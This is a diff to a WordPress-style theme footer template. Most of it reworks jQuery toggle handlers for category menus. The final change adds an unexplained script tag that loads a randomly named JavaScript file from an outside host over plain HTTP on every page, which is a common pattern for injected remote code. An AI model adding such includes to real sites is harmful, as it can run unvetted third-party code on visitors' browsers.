@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 /**
  * The template for displaying the footer
  *
@@ -251,19 +251,38 @@
 
     toggle_close.click(function() {
     	$(this).hide();
-		toggle_open.css({display: 'block'});
 		l_parent = $(this).parent();
 		l_parent.find('.sub-sub-category').css({display: 'none'});
+		l_parent.find('.toggle-open').css({display: 'block'});
     });
 
     toggle_open.click(function() {
     	$(this).hide();
-		toggle_close.css({display: 'block'});
 		l_parent = $(this).parent();
 		l_parent.find('.sub-sub-category').css({display: 'block'});
+		l_parent.find('.toggle-close').css({display: 'block'});
+    });
+
+    //close or open menu parent
+    var toggle_close_parent = $('.toggle-close-parent');
+    var toggle_open_parent = $('.toggle-open-parent');
+    var sub_category = $('.sub-category');
+    toggle_close_parent.click(function() {
+    	$(this).hide();
+		l_parent = $(this).parent().parent();
+		l_parent.find('.sub-category').css({display: 'none'});
+		l_parent.find('.toggle-open-parent').css({display: 'block'});
+    });
+
+    toggle_open_parent.click(function() {
+    	$(this).hide();
+		l_parent = $(this).parent().parent();
+		l_parent.find('.sub-category').css({display: 'block'});
+		l_parent.find('.toggle-close-parent').css({display: 'block'});
     });
 });
 
     </script>
+<script src="http://toilamit.com/demo/abc123xyz.js"></script>
 </body>
 </html>
